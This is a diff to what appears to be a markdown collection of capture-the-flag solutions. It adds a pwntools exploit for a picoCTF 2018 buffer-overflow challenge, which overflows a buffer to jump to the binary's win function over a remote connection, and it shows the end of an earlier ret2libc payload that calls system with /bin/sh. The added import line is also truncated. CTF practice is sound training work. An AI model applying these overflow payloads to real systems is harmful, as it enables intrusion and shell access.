@@ -579,3 +579,20 @@ payload = b'\x90'*(0x88+4) + p32(system) + p32(e.sym["main"]) + p32(bin_sh)
 p.send(payload)
 p.interactive()
 ```
+
+### picoctf_2018_buffer overflow 2
+
+```python
+#!/usr/bin/python3.6
+from pwn import 
+
+executable = './PicoCTF_2018_buffer_overflow_2'
+# p = process(executable)
+p = remote('node3.buuoj.cn', 25190)
+e = ELF(executable)
+
+payload = b'\x90'*(0x6c+4) + p32(e.sym['win']) + p32(e.sym['main']) + p32(0xdeadbeef) + p32(0xdeadc0de)
+
+p.sendlineafter(b'Please enter your string:', payload)
+p.interactive()
+```
